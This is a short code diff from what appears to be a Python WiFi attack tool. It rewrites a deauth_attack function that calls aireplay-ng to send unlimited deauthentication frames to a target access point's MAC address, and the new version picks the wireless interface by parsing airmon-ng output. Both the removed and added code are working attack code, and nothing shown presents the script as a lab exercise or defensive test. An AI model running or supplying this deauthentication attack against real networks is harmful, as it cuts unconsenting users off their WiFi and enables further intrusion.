@@ -51,12 +51,20 @@ def set_channel(channel: str) -> None:
     except subprocess.CalledProcessError as e:
         print(f"Error setting channel: {e}")
 
-def deauth_attack(mac_address: str, interface_name: str) -> None:
-    """Perform a deauth attack on a WiFi network"""
-    try:
-        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error performing deauth attack: {e}")
+def deauth_attack(mac_address):
+    # Get the current interface name
+    output = subprocess.check_output(["airmon-ng"])
+    interface_name = None
+    for line in output.decode("utf-8").split("\n"):
+        if "wlan0" in line:
+            interface_name = line.split()[1]
+            break
+    if interface_name is None:
+        print("Failed to get interface name")
+        return
+    # Perform deauth attack
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
+
 
 def get_connected_devices(interface_name: str) -> List[str]:
     """Get a list of connected devices"""
